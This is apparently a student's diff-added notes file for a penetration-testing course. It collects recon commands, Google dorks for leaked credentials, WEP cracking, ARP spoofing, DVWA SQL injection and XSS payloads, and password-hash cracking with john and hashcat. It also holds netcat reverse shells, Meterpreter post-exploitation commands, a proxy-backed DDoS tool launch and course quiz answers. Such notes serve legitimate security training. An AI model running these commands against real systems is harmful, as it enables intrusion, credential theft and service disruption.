@@ -1,0 +1,845 @@
+DNS lookups
+
+nslookup
+cisco.com
+
+nslookup
+set type=ns
+cisco.com
+
+nslookup netacad.com 8.8.8.8
+
+nslookup
+server 8.8.8.8
+netacad.com
+
+nslookup
+set type=any
+netacad.com
+
+nslookup
+server 8.8.8.8
+set type=any
+netacad.com
+
+whois cisco.com
+
+whois 72.163.5.201
+
+dig cisco.com
+dig cisco.com AAAA
+dig cisco.com 8.8.8.8 ns
+dig netacad.com any
+dig netacad.com mx
+dig -x 72.163.5.201
+dig -x 72.163.1.1
+host hsrp-72-163-10-1.cisco.com
+
+nslookup
+72.163.5.201
+
+dnsrecon -d h4ck3r.org
+
+NOTE You can obtain detailed information about certificate transparency from https://certificate.transparency.dev.
+
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+sudo apt install -y aha
+sudo apt install -y kali-desktop-core
+sudo apt install -y spice-vdagent
+------------------------------------------------
+pip3 install h8mail
+The following are additional tools that allow you to search for breach data dumps:
+
+WhatBreach: https://github.com/Ekultek/WhatBreach
+LeakLooker: https://github.com/woj-ciech/LeakLooker
+Buster: https://github.com/sham00n/buster
+Scavenger: https://github.com/rndinfosecguy/Scavenger
+PwnDB: https://github.com/davidtavarez/pwndb
+----------------------------------------------------
+File Metadata
+
+exiftool image.png
+exiftool -csv > /path/to/out.csv <File Or Dir>
+
+Dorks
+intext:JSESSIONID OR intext:PHPSESSID inurl:access.log ext:log
+"public $user =" | "public $password = " | "public $secret =" | "public $db =" ext:txt | ext:log -git
+
+https://archive.org/web
+cache.<DOMAIN>
+------------------------------------------------------
+pip3 install h8mail
+
+ip2location.com/free/email-tracer
+---------------------------------------------------------------------------------------------------
+Mod 5
+sudo ettercap -T -Q -I br-internal --write mitm_saved.pcap --mitm arp /106.6.6.23// /10.6.6.11//
+
+airmon-ng start wlan1
+airodump-ng wlan1mon
+
+deauthentication attack
+airmon-ng -0 0 -a mac interface
+
+Using Airodump-ng to Listen to All Traffic to the BSSID 08:02:8E:D3:88:82
+airodump-ng -c 11 --bssid 08:02:8E:D3:88:82 -w omar_capture wlan0
+
+Using Aireplay-ng to Inject ARP Packets
+aireplay-ng -3 -b 08:02:8E:D3:88:82 -h 00:0F:B5:88:AC:82 wlan0
+
+Using Aircrack-ng to Crack the WEP PSK
+aircrack-ng -b 08:02:8E:D3:88:82 omar_capture.cap
+
+Attacks Against WEP
+airmon-ng start wlan0 11 
+airodump-ng -c 11 --bssid 08:02:8E:D3:88:82 -w omar_capture wlan0
+aireplay-ng -3 -b 08:02:8E:D3:88:82 -h 00:0F:B5:88:AC:82 wlan0
+aircrack-ng -b 08:02:8E:D3:88:82 omar_capture.cap
+
+
+The WPA3 protocol introduced a new handshake called the “dragonfly handshake” 
+that uses Extensible Authentication Protocol (EAP) for authentication. 
+This ensures that the WPA3 protocol is immune from KRACK or DoS attacks.
+
+False
+---------------------------------------------------------------------------------------------------
+Scapy
+sudo scapy
+sniff()
+a=_
+a.summary()
+send(IP(dst="192.168.88.251")/ICMP()/"malicious_payload")
+sudo tshark host 192.168.78.142
+ls(), ls(TCP), ls(DNS), ls(IP)
+explore(), explore(DNS)
+ans, unans = sr(IP(dst='192.168.88.251')/TCP(dport=445,flags='S'))
+sudo tshark host 192.168.78.142
+
+ Capture and save traffic on a specific interface.
+In this step, you will capture traffic to and from a device connected to a virtual network in your Kali Linux VM.
+
+Open a new terminal window. Use the ifconfig command to determine the name of the interface that is assigned the IP address 10.6.6.1. >
+Return to the terminal window that is running the Scapy tool. Use the syntax sniff(iface="interface name") to begin the capture on the>
+>>> sniff(iface="br-internal")
+Open Firefox and navigate to the URL http://10.6.6.23/. When the Gravemind home page opens, return to the terminal window that is runn>
+^C<Sniffed: TCP:112 UDP:0 ICMP:0 Other:2>
+View the captured traffic as you did in Step 1d.
+>>> a=_
+>>> a.summary()
+---------------------------------------------------------------------------------------------------
+Mod 6
+
+nikto -url http://scanme.nmap.org
+nikto -h ip_list
+nikto -h https://nmap.org -ssl
+
+
+sudo nmap -sV -p 445 -script smb-brute 172.17.0.2
+sudo apt install rsh-redone-client
+rsh -l msfadmin 172.17.0.2
+
+pwd
+sudo su
+msfadmin
+
+sudo /usr/sbin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
+john /tmp/crack.password.db
+john -show /tmp/crack.password.db 
+---------------------------------------------------------------------------------------------------
+SQL Injection
+
+SQL Injection Mitigations
+
+Input validation is an important part of mitigating SQL injection attacks. The best mitigation for SQL injection vulnerabilities is to use immutable queries, such as the following:
+
+Static queries
+Parameterized queries
+Stored procedures (if they do not generate dynamic SQL)
+Immutable queries do not contain data that could get interpreted. In some cases, they process the data as a single entity that is bound to a column without interpretation.
+
+The following are two examples of static queries:
+
+  select * from contacts;
+select * from users where user = "omar";
+The following are examples of parameterized queries:
+
+  String query = "SELECT * FROM users WHERE name = ?";
+PreparedStatement statement =
+connection.prepareStatement(query);
+statement.setString(1, username);
+ResultSet results = statement.executeQuery();
+
+##
+An attacker used the following SQL statement toward a database application:
+
+SELECT * FROM IT_Admins WHERE customer_id=1; DELETE FROM IT_Admins
+Which type of SQL injection attack was performed?
+Stacked queries
+##
+
+##
+198.51.100.5;cat /etc/passwd
+command injection
+##
+
+## ------DVWA------ ##
+' or 1=1 #
+You have entered an “always true” expression that was executed by the database server. 
+The result is that all entries in the ID field of the database were returned.
+
+1 ' ORDER BY 1#
+1 ' ORDER BY 2#
+1 ' ORDER BY 3#
+
+This time you should receive the error Unknown column '3' in 'order clause'.
+
+Because the third string returned an error, this tells us the query involves two fields. 
+This is useful information to know as you continue your exploit.
+
+Caheck version
+1' OR 1=1 UNION SELECT 1, VERSION()#
+Determine the database name
+1’ OR 1=1 UNION SELECT 1, DATABASE()#
+Retrive table names
+1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+
+1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+
+SELECT * FROM users WHERE username = 'username' AND password = 'password';
+
+https://crackstation.net
+
+##
+TIP It is recommended to change the default session ID name of the web development framework to a generic name, such as id. 
+The session ID must be long enough to prevent brute-force attacks. 
+Sometimes developers set it to just a few bits, but the session ID must be at least 128 bits (16 bytes). 
+Also, the session ID must be unique and unpredictable. 
+It’s a good idea to use a cryptographically secure pseudorandom number generator (PRNG) because the session ID value must provide 
+at least 256 bits of entropy.
+
+
+You are checking for session hijacking vulnerabilities by following a checklist of best practices that web application developers should follow when implementing session IDs. What should you be looking for? (Choose three.)
+
+The session ID is unique and unpredictable.
+The minimum length of the session ID is 128 bits.
+The default session ID name has been changed to something generic.
+##
+
+# Crack hash
+echo -n 'Password' | md5sum | awk '{ print $1 }' > my_pw_hashes.txt
+echo -n 'Password123' | md5sum | awk '{ print $1 }' >> my_pw_hashes.txt
+echo -n 'Letmein!' | md5sum | awk '{ print $1 }' >> my_pw_hashes.txt
+echo -n 'ilovedogs' | md5sum | awk '{ print $1 }' >> my_pw_hashes.txt
+echo -n '1234abcd' | md5sum | awk '{ print $1 }' >> my_pw_hashes.txt
+
+cat my_pw_hashes.txt
+sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+sudo hashcat -m 0 -a 0 -o cracked.txt my_pw_hashes.txt /usr/share/wordlists/rockyou.txt
+sudo cat cracked.txt
+dc647eb65e6711e155375218212b3964:Password
+ef73781effc5774100f87fe2f437a435:1234abcd
+33830b8b7fd414b12c208c4de5055464:ilovedogs
+42f749ade7f9e195bf475f37a44cafcb:Password123
+e85a3b267e94f3721117fc7ac54fbeba:Letmein!
+john --format=raw-md5 my_pw_hashes.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 my_pw_hashes.txt
+john --incremental my_pw_hashes.txt
+john --show --format=raw-md5 my_pw_hashes.txt
+?:Password
+?:Password123
+?:Letmein!
+?:ilovedogs
+?:1234abcd
+
+5 password hashes cracked, 0 left
+
+# sudo apt install rainbowcrack
+sudo rtgen md5 loweralpha 1 3 0 1000 1000 0
+ls /usr/share/rainbowcrack
+cd /usr/share/rainbowcrack
+sudo rtsort .
+echo -n 'dog' | md5sum | awk '{print $1}'
+rcrack . -h 06d80eb0c50b49a509b49f2424e8c805
+1 rainbow tables found
+memory available: 708450713 bytes
+memory for rainbow chain traverse: 16000 bytes per hash, 16000 bytes for 1 hashes
+memory for rainbow table buffer: 2 x 16016 bytes
+disk: ./md5_loweralpha#1-3_0_1000x1000_0.rt: 16000 bytes read
+disk: finished reading all files
+plaintext of 06d80eb0c50b49a509b49f2424e8c805 is dog
+
+statistics
+----------------------------------------------------------------
+plaintext found:                             1 of 1
+total time:                                  0.03 s
+time of chain traverse:                      0.02 s
+time of alarm check:                         0.00 s
+time of disk read:                           0.00 s
+hash & reduce calculation of chain traverse: 499000
+hash & reduce calculation of alarm check:    10467
+number of alarm:                             1171
+performance of chain traverse:               19.96 million/s
+performance of alarm check:                  5.23 million/s
+
+result
+----------------------------------------------------------------
+06d80eb0c50b49a509b49f2424e8c805  dog  hex:646f67
+--------------------------------------------------------------------------------------------------------
+echo -n 'fox' | md5sum | awk '{print $1}' > ~/my_rainbow_hashes.txt
+echo -n 'boo' | md5sum | awk '{print $1}' >> ~/my_rainbow_hashes.txt
+echo -n 'pop' | md5sum | awk '{print $1}' >> ~/my_rainbow_hashes.txt
+
+
+rcrack . -l ~/my_rainbow_hashes.txt
+1 rainbow tables found
+memory available: 708437606 bytes
+memory for rainbow chain traverse: 16000 bytes per hash, 48000 bytes for 3 hashes
+memory for rainbow table buffer: 2 x 16016 bytes
+disk: ./md5_loweralpha#1-3_0_1000x1000_0.rt: 16000 bytes read
+disk: finished reading all files
+plaintext of ae3e83e2fab3a7d8683d8eefabd1e74d is boo
+plaintext of b21afc54fb48d153c19101658f4a2a48 is pop
+plaintext of 2b95d1f09b8b66c5c43622a4d9ec9a04 is fox
+
+statistics
+----------------------------------------------------------------
+plaintext found:                             3 of 3
+total time:                                  0.07 s
+time of chain traverse:                      0.07 s
+time of alarm check:                         0.00 s
+time of disk read:                           0.00 s
+hash & reduce calculation of chain traverse: 1497000
+hash & reduce calculation of alarm check:    16980
+number of alarm:                             2434
+performance of chain traverse:               20.79 million/s
+performance of alarm check:                  8.49 million/s
+
+result
+----------------------------------------------------------------
+2b95d1f09b8b66c5c43622a4d9ec9a04  fox  hex:666f78
+ae3e83e2fab3a7d8683d8eefabd1e74d  boo  hex:626f6f
+b21afc54fb48d153c19101658f4a2a48  pop  hex:706f70
+# ------------------------------------------------------------------------------ #
+
+# ---------------- John --------------------- #
+john --test=10
+john --format=NT hash.txt
+john --format=Raw-MD5 hash.txt
+john --format=sha512crypt shadow.txt
+john --list=formats | tr ',' '\n' | grep -i ssh
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+john sql
+john --incremental=ASCII hash.txt
+john --incremental=Digits hash.txt
+john --incremental=Alnum hash.txt
+
+john --mask=?u?l?l?l?l?l?d?d?s hash.txt
+
+john --wordlist=rockyou.txt --rules=Jumbo --fork=8 hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 crack.txt
+john --format=lm crack.txt
+===============================================================
+Linux shadow files#
+
+The /etc/passwd and /etc/shadow files need to be combined into one input file:
+
+unshadow /etc/passwd /etc/shadow > shadow-combined.txt
+john --wordlist=rockyou.txt --rules=Single shadow-combined.txt
+
+unshadow /etc/passwd /etc/shadow > output.db
+john output.db
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 md5hash.txt
+===============================================================
+
+zip2john secret.zip > zip.hash
+pdf2john confidential.pdf > pdf.hash
+office2john document.docx > office.hash
+ssh2john id_rsa > ssh.hash
+keepass2john credentials.kdbx > kp.hash
+
+NTLM
+cut -d: -f4 ntds.dit.dump > ntlm-hashes.txt
+john --format=NT --wordlist=rockyou.txt --rules=KoreLogic ntlm-hashes.txt
+
+
+# ------------------------------------------- #
+
+You are investigating the security of a web application and want to determine if the application is vulnerable to HTTP 
+parameter pollution attacks (HPP). Which URL would you use to attempt an HPP exploit?
+
+https://store.h4cker.org/?search=battery&results=30&search=knives
+
+----------------------------------------------------------------------------------
+# XSS
+<script>alert("You are hacked!")</script>
+<ScRipt>alert("You are hacked!")</ScRipt>
+<img src=x onerror=alert("You_are_hacked!")>
+
+# CSRF
+the web form asks the user to change a password. If you take a closer look at the URL in Figure 6-21, you see that it contains the parameters password_new=test&password_conf=test&Change=Change#. Not only is the password displayed in the URL after the user has entered it in the web form, but because the application allows this, an attacker can easily send a crafted link to any user to change his or her password, as shown here:
+
+http://192.168.78.8:66/vulnerabilities/csrf/?password_new=newpasswd&password_conf=newpasswd &Change=Change#
+If the user follows this link, his or her password will be changed to newpasswd.
+
+NOTE CSRF mitigations and defenses are implemented on the server side. The paper located at the following link describes several techniques to prevent or mitigate CSRF vulnerabilities: https://seclab.stanford.edu/websec/csrf/csrf.pdf.
+
+----------------------------------------------------------------------------------
+### ---------------------------   About APIs ------------- ###
+You can also use fuzzing to find API vulnerabilities (or vulnerabilities in any application or system). According to OWASP, “Fuzz testing or Fuzzing is an unknown environment/black box software testing technique, which basically consists in finding implementation bugs using malformed/semi-malformed data injection in an automated fashion.”
+
+NOTE Refer to the OWASP page https://www.owasp.org/index.php/Fuzzing to learn about the different types of fuzzing techniques to use with protocols, applications, and other systems. In Module 10 you will see examples of fuzzers and how to use them to find vulnerabilities.
+
+When testing APIs, you should always analyze the collected requests to optimize fuzzing. After you find potential parameters to fuzz, determine the valid and invalid values that you want to send to the application. Of course, fuzzing should focus on invalid values (for example, sending a GET or PUT with large values or special characters, Unicode, and so on). In Module 10 you will learn about tools like Radamsa (https://gitlab.com/akihe/radamsa) that can be used to create fuzzing parameters for testing applications, protocols, and more.
+
+NOTE OWASP has a REST Security Cheat Sheet that provides numerous best practices on how to secure RESTful (REST) APIs. See https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html.
+
+The following are several general best practices and recommendations for securing APIs:
+
+Secure API services to provide HTTPS endpoints with only a strong version of TLS.
+Validate parameters in the application and sanitize incoming data from API clients.
+Explicitly scan for common attack signatures; injection attacks often betray themselves by following common patterns.
+Use strong authentication and authorization standards.
+Use reputable and standard libraries to create the APIs.
+Segment API implementation and API security into distinct tiers; doing so frees up the API developer to focus completely on the application domain.
+Identify what data should be publicly available and what information is sensitive.
+If possible, have a security expert do the API code verification.
+Make internal API documentation mandatory.
+Avoid discussing company API development (or any other application development) on public forums.
+NOTE CWE-227, “API Abuse,” covers unsecured APIs. For detailed information about CWE-227, see https://cwe.mitre.org/data/definitions/227.html.
+### ------------------------------------------------------ ###
+### Mod 7
+searchsploit "Denial of Service" | grep "Linux Kernel" | awk
+
+---------------------------------------------------------
+Another example of a DoS attack that can affect cloud environments is the direct-to-origin (D2O) attack. 
+In a D2O attack, threat actors are able to reveal the origin network or IP address behind a content delivery network (CDN) 
+or large proxy placed in front of web services in a cloud provider. 
+A D2O attack could allow attackers to bypass different anti-DDoS mitigations.
+
+git clone https://github.com/MatrixTM/MHDDoS.git
+cd MHDDoS
+pip3 install -r requirements.txt
+wget https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt
+python start.py bypass $TARGET 5 101 socks5.txt 100 3600
+
+https://github.com/MatrixTM/MHDDoS/wiki/Usage-of-script
+
+* Docker
+git clone https://github.com/MatrixTM/MHDDoS.git
+cd MHDDoS
+docker compose build
+
+docker compose run -it --entrypoint /bin/bash mhddos
+---------------------------------------------------------
+# Mod 7-2 Mobile reletaed
+MobSF is an automated mobile application and malware analysis framework. 
+You can download it from https://github.com/MobSF/Mobile-Security-Framework-MobSF.
+
+This open-source framework is used to test the security of iOS applications. 
+You can download needle from https://github.com/WithSecureLabs/needle.
+
+This Android testing platform and framework provides access to numerous exploits that can be used to attack Android platforms. 
+You can download Drozer from https://labs.withsecure.com/tools/drozer.
+
+Frida is a dynamic instrumentation toolkit for security researchers and reverse engineers. 
+You can download it from https://frida.re.
+
+This runtime mobile platform and app exploration toolkit uses Frida behind the scenes. 
+You can use Objection to bypass certificate pinning, dump keychains, perform memory analysis, and launch other mobile attacks. 
+You can download Objection from https://github.com/sensepost/objection.
+
+This tool enables you to decompile Android application package (APK) files. 
+You can download it from https://github.com/b-mueller/apkx.
+
+You can use Android SDK tools to analyze and obtain detailed information about the Android environment. 
+You can download Android Studio, which is the primary Android SDK provided by Google, from https://developer.android.com/studio.
+
+You can use this tool to reverse engineer Android applications. 
+You can download APK Studio from https://github.com/vaibhavpandeyvpz/apkstudio.
+
+You are drafting a set of recommendations to give Pixel Paradise for guidance as they design and code their planned mobile 
+gaming app. You are writing about the principle of least privilege. 
+Why should the mobile application developers use this principle as they develop the mobile application?
+
+It limits device access and does not allow applications to run as root.
+
+---------------------------------------------------------------------------------------------------------
+# Mod 7-2-10
+
+You are compiling a checklist of items that you will verify as part of the test of the Pixel Paradise 
+networked video surveillance devices. 
+What should you verify to ensure that the devices are secure? (Choose three.)
+
+The default configurations and credentials of the IoT devices have been changed.
+The IoT devices support encrypted communications.
+The software on the video devices is can be updated when needed.
+
+# Mod 7-2-14-15
+Anchore’s Grype
+Grype is an open-source container vulnerability scanner that you can download from https://github.com/anchore/grype. 
+Figure 7-9 demonstrates the use of the Grype scanner to find vulnerabilities in a Docker image.
+
+Clair
+Clair is another open-source container vulnerability scanner. You can download it from https://github.com/quay/clair.
+
+Dagda
+This set of open-source static analysis tools can help detect vulnerabilities, Trojans, backdoors, and malware in Docker images 
+and containers. It uses the ClamAV antivirus engine to detect malware and vulnerabilities. 
+You can download Dagda from https://github.com/eliasgranderubio/dagda/.
+
+kube-bench
+This open-source tool performs a security assessment of Kubernetes clusters based on the CIS Kubernetes Benchmark. 
+You can download kube-bench from https://github.com/aquasecurity/kube-bench.
+
+kube-hunter
+This open-source tool is designed to check the security posture of Kubernetes clusters. 
+You can download kube-hunter from https://kube-hunter.aquasec.com/.
+
+Falco
+You can download this threat detection engine for Kubernetes from https://falco.org/.
+
+***
+Another strategy that threat actors have used for years is to insert malicious code into Docker images on Docker Hub 
+(https://hub.docker.com). This has been a very effective “supply chain” attack.
+
+---------------------------------------------------------------------------------------------------------------------
+# Mod 8
+
+nc -lvp 1234 -e /bin/bash
+nc -nv 192.168.78.6 1234
+nc -lvp 1234 -e /bin/bash
+nc -lvp 666
+nc 192.168.78.147 666 -e /bin/bash
+nc -lvp 666
+
+Command Description
+nc -nv <IP Address> <Port> Using Netcat to connect to a TCP port
+nc -lvp <port> Listening on a given TCP port
+nc -lvp 1234 > output.txt
+# Receiving system
+nc -nv <IP Address> < input.txt
+# Sending system
+Used to transfer a file
+nc -nv <IP Address> 80
+GET / HTTP/1.1
+Connecting and receiving a web page. Port 443 can be used for HTTPS
+connections.
+nc -z <IP Address> <port range> Using Netcat as a port scanner
+
+Meterpreter Command Description
+
+cat, cd, pwd, and ls These commands are the same as the ones in Linux or Unix-based systems.
+lpwd and lcd These commands are used to display and change the local directory (on the attacking system).
+clearev
+This command is used to clear the Application, System, and Security logs on a Windows-based
+system.
+download This command is used to download a file from a victim system.
+edit This command is used to open and edit a file on a victim system using the Vim Linux environment.
+execute This command is used to run commands on the victim system.
+getuid This command is used to display the user logged in on the compromised system.
+hashdump This command is used to dump the contents of the SAM database in a Windows system.
+idletime
+This command is used to display the number of seconds that the user at the victim system has
+been idle.
+ipconfig
+This command is used to display the network interface configuration and IP addresses of the
+victim system.
+migrate This command is used to migrate to a different process on the victim system.
+ps This command is used to display a list of running processes on the victim system.
+resource
+This command is used to execute Meterpreter commands listed inside a text file, which can help
+accelerate the actions taken on the victim system.
+search This command is used to locate files on the victim system.
+shell This command is used to go into a standard shell on the victim system.
+upload This command is used to upload a file to the victim system.
+webcam_list This command is used to display all webcams on the victim system.
+webcam_snap This command is used to take a snapshot (picture) using a webcam of the victim system.
+
+TIP Metasploit Unleashed is a free detailed Metasploit course released by Offensive Security. 
+The course can be accessed at https://www.offensive-security.com/metasploit-unleashed.
+
+***
+8.1 Creating a Foothold and
+Maintaining Persistence After
+Compromising a System
+
+lpwd to display the local directory on the attacking system
+webcam_list to display all webcams on the victim system
+execute to run commands on the victim system
+shell to go into a standard shell on the victim system
+search to locate file on the victim system
+getuid to display the user logged in on the compromised system
+resource to execute Meterpreter commands listed inside a text file
+***
+
+socat
+A C2 utility that can be used to create multiple reverse shells (see http://www.dest-unreach.org/socat)
+wsc2
+A Python-based C2 utility that uses WebSockets (see https://github.com/Arno0x/WSC2)
+WMImplant
+A PowerShell-based tool that leverages WMI to create a C2 channel (see https://github.com/ChrisTruncer/WMImplant)
+DropboxC2 (DBC2)
+A C2 utility that uses Dropbox (see https://github.com/Arno0x/DBC2)
+TrevorC2
+A Python-based C2 utility created by Dave Kennedy of TrustedSec (see https://github.com/trustedsec/trevorc2)
+Twittor
+A C2 utility that uses Twitter direct messages for command and control (see https://github.com/PaulSec/twittor)
+DNSCat2
+A DNS-based C2 utility that supports encryption and that has been used by malware, threat actors, and pen testers 
+(see https://github.com/iagox86/dnscat2)
+
+TIP A large number of open-source C2 and adversarial emulation tools are listed in The C2 Matrix, 
+along with supported features, implant support, and other information, at https://www.thec2matrix.com.
+-------------------------------------------------------------------------------------------------------------------
+# Mod 8-2
+PowerShell for Post-Exploitation Tasks
+You can use PowerShell to get directory listings, copy and move files, get a list of running processes, and perform administrative
+tasks. Table 8- 4 lists and describes some of the most useful PowerShell commands that can be used for post-exploitation tasks.
+Table 8-4 - Useful PowerShell Commands for Post-Exploitation Tasks
+PowerShell Command Description
+Get-ChildItem Lists directories
+Copy-Item sourceFile.doc destinationFile.doc Copies a file (cp,copy,cpi)
+Move-Item sourceFile.doc destinationFile.doc Moves a file (mv,move,mi)
+Select-String -path c:\users \*.txt -pattern password Finds text within a file
+Get-Content omar_s_ passwords.txt Prints the contents of a file
+Get-Location Gets the present directory
+Get-Process Gets a process listing
+Get-Service Gets a service listing
+Get-Process | Export-Csv procs.csv Exports output to a comma-separated values (CSV) file
+1..255 | % {echo "10.1.2.$_"; ping -n 1 -w 100
+10.1.2.$_ | SelectString ttl}
+Launches a ping sweep to the 10.1.2.0/24 network
+1..1024 | % {echo ((new-object Net.Sockets.
+TcpClient).Connect ("10.1.2.3",$_)) "Port $_ is
+open!"} 2>$null
+Launches a port scan to the 10.1.2.3 host (scans for
+ports 1 through 1024)
+(New-Object System.Net.WebClient).
+DownloadFile ("http://10.1.2.3/nc.exe",
+"nc.exe")
+Fetches a file via HTPP (similar to the wget Linux
+command)
+Get-HotFix Obtains a list of all installed hotfixes
+cd HKLM:\
+ls
+Navigates the Windows registry
+Get-NetFirewallRule -all
+New-NetFirewallRule -Action Allow
+-DisplayName LetMeIn - RemoteAddress
+10.6.6.6
+Lists and modifies the Windows firewall rules
+Get-Command Gets a list of all available commands
+----------------------------------------------------------------------------------------------
+# Mod 8-2-8
+cat secret.txt
+Credit card data:
+4011 5555 5555 5555 5555 exp 08/29 ccv: 123
+4021 6666 7777 8888 9999 exp 02/29 ccv: 321
+
+steghide embed -ef secret.txt -cf websploit-logo.jpg
+steghide extract -sf websploit-logo.jpg -xf extracted_data.txt
+cat extracted_data.txt
+------------------------------------------------------------------------------------------------
+9.1.4 Storage Time for Report and Secure Distribution
+The classification of a report’s contents is driven by the organization that the penetration test has been performed on and its 
+policies on classification. In some cases, the contents of a report are considered top secret. 
+However, as a rule of thumb, you should always consider report contents as highly classified and distribute 
+them on a need-to-know basis only. The classification of report contents also determines the method of delivery.
+
+In general, there are two ways to distribute a report: as a hard copy or electronically. 
+Many times, when you perform the readout of the findings from your report, you will be meeting with the stakeholders who 
+requested the penetration test to be performed. This meeting will likely include various people from the organization, including IT, 
+information security, and management. In most cases, they will want to have a hard copy in front of them as you walk through the
+ readout of the findings. This is, of course, possible, but the process should be handled with care.
+
+The following are some examples of how to control the distribution of reports:
+
+Produce only a limited number of copies.
+Define the distribution list in the scope of work.
+Label each copy with a specific ID or number that is tied to the person it is distributed to.
+Label each copy with the name of the person it is distributed to.
+Keep a log of each hard copy, including who it was distributed to and the date it was distributed. 
+Table 9-2 shows an example of such a log.
+Ensure that each copy is physically and formally delivered to the designated recipient.
+If transferring a report over a network, ensure that the document is encrypted and the method of transport is encrypted.
+Ensure that the handling and distribution of an electronic copy of a report are even more restrictive than for a hard copy:
+- Control distribution on a secure server that is owned by the department that initially requested the penetration test.
+- Provide only one copy directly to the client or requesting party.
+- Once the report is delivered to the requesting party, use a documented, secure method of deleting all 
+collected information and any copy of the report from your machine.
+---------------------------------------------------------------------------------------------------
+TIP There are two editions of the Dradis Framework. The Community Edition (CE) is an open-source version 
+that is freely available under the GPLv2 license. The Professional Edition (PE) is a commercial product that includes 
+additional features for managing projects as well as more powerful reporting capabilities. 
+The Community Edition can be found at https://github.com/dradis/dradis-ce. 
+Information on the Professional Edition is available at https://dradisframework.com .
+
+https://github.com/santosomar/public-pentesting-reports
+
+
+---------------------------------------------------------------------------------------------------
+# Mod 10
+
+nmap -sV --script vulners --script-args mincvss=4 10.6.6.23
+
+This command will display known vulnerabilities and their corresponding CVE. 
+The mincvss argument will limit the output to only CVEs with CVSS scores higher than 4.
+
+nmap --script smb-enum-users.nse -p139,445 10.6.6.23
+Server Message Block (SMB) usernames on the target computer at 10.6.6.23
+
+1' OR 1=1 UNION SELECT user, password FROM users #
+It is an SQL injection exploit. The purpose is to retrieve usernames and passwords from a database table called “users”.
+
+smbclient //172.17.0.2/tmp
+smb: >put malicious_file.txt malicious_file.txt
+starts samba connection to 172.17.0.2 to /tmp dir 
+The transfer of files between systems using the smbclient utility
+
+# Mod 10-1-20
+#!/bin/bash
+# Check if IP of target is entered
+if [ -z "$1" ]
+then
+   echo "Correct usage is ./recon.sh <IP>"
+   exit 1
+
+else
+   echo "Target IP $1"
+fi
+
+chmod +x recon.sh
+
+./recon.sh 10.6.6.23
+
+
+----------------------------------------
+#!/bin/bash
+# Check if IP of target is entered
+if [ -z "$1" ]
+  then
+    echo "Correct usage is ./recon.sh <IP>"
+    exit
+  else
+    echo "Target IP $1"
+    echo "Running Nmap…"
+# Run Nmap scan on target and save results to file
+    nmap -sV $1 > scan_results.txt
+    echo "Scan complete – results written to scan_results.txt"
+fi
+
+./recon.sh 10.6.6.23
+----------------------------------------
+
+#!/bin/bash
+# Check if IP of target is entered
+if [ -z "$1" ]
+ then
+    echo "Correct usage is ./recon.sh "
+   exit
+  else
+    echo "Target IP $1"
+    echo "Running Nmap…"
+# Run Nmap scan on target and save results to file
+    nmap -sV $1 > scan_results.txt
+    echo "Scan complete – results written to scan_results.txt"
+fi
+# If the Samba port 445 is found and open, run enum4linux.
+if grep 445 scan_results.txt | grep -iq open
+  then
+    enum4linux -U -S $1 >> scan_results.txt
+    echo "Samba found. Enumeration complete."
+    echo "Results added to scan_results.txt."
+    echo "To view the results, cat the file."
+  else
+   echo "Open SMB share ports not found."
+fi
+
+./recon.sh 10.6.6.23
+
+in terminal run containers the copy the ip addresses to to_scan.txt
+nmap -sn -iL to_scan.txt
+--------------------------------------------------------------------
+# --------------- Mod 10-2 ------------- #
+# --- Passive reconnaissance --- #
+nslookup store.h4cker.org
+dig store.h4cker.org
+whois h4cker.org
+exif omar_pic.jpg
+theharvester -d h4cker.org -b all
+shodan stats smart install
+
+recon-ng
+show modules
+keys list
+use recon/hosts-hosts/resolve
+[recon-ng][default][resolve] > show info
+
+use recon/domains-hosts/shodan_hostname
+set SOURCE example.org
+run
+
+censys.io
+
+# --- Active reconnaissance --- #
+nmap -T4 10.1.1.0/24
+enum4linux -v 10.1.1.14
+
+# --- SQLMAP --- #
+sqlmap -u "http://10.1.1.14/dvwa/vulnerabilities/sqli/?id=omar&Submit=Submit" --cookie="security=low; PHPSESSID=1558e11b491da91be3b68e5cce953ca4" --dbs
+sqlmap -u "http://10.1.1.14/dvwa/vulnerabilities/sqli/?id=omar&Submit=Submit" --cookie="security=low; PHPSESSID=1558e11b491da91be3b68e5cce953ca4" -D dvwa --dump-all
+
+# --- Nikto --- #
+nikto -host 10.1.1.14
+nmap -p 80 10.1.1.0/24 -oG - | nikto -h -
+
+# --- Cracking --- #
+
+echo "user1:5f4dcc3b5aa765d61d8327deb882cf99" > my_hashes.txt
+echo "john:5f4dcc3b5aa765d61d8327deb882cf99" >> my_hashes.txt
+echo "mary:5f4dcc3b5aa765d61d8327deb882cf99" >> my_hashes.txt
+echo "testuser:5f4dcc3b5aa765d61d8327deb882cf99" >> my_hashes.txt
+echo "admin:5f4dcc3b5aa765d61d8327deb882cf99" >> my_hashes.txt
+
+
+echo -e "user1:\$6\$randomsalt\$WS2qjCQ1JrmZv8otdbtntIYu6lRzkk2aIVhgIMdMexOcvD9bEAoxtKcyZLXbR3wlhOOPBscJbLCPUU/fYjFhM0:18234:0:99999:7:::\nuser2:\$6\$anothersalt\$ZffCt8y5Hl8gLYS79/rhyT76C12kNhuOvkFR8Ll0RXcjQz2Nzuh3VUdT//e21HYfH6fP9btOp2aG22O3S7q1z/:18234:0:99999:7:::" > sample_hashes.txt
+
+cat > sample_hashes.txt << 'EOF'
+user1:$6$randomsalt$WS2qjCQ1JrmZv8otdbtntIYu6lRzkk2aIVhgIMdMexOcvD9bEAoxtKcyZLXbR3wlhOOPBscJbLCPUU/fYjFhM0:18234:0:99999:7:::
+user2:$6$anothersalt$ZffCt8y5Hl8gLYS79/rhyT76C12kNhuOvkFR8Ll0RXcjQz2Nzuh3VUdT//e21HYfH6fP9btOp2aG22O3S7q1z/:18234:0:99999:7:::
+EOF
+
+john --wordlist=/usr/share/wordlists/rockyou.txt sample_hashes.txt
+
+john --list=formats
+useradd -m chris
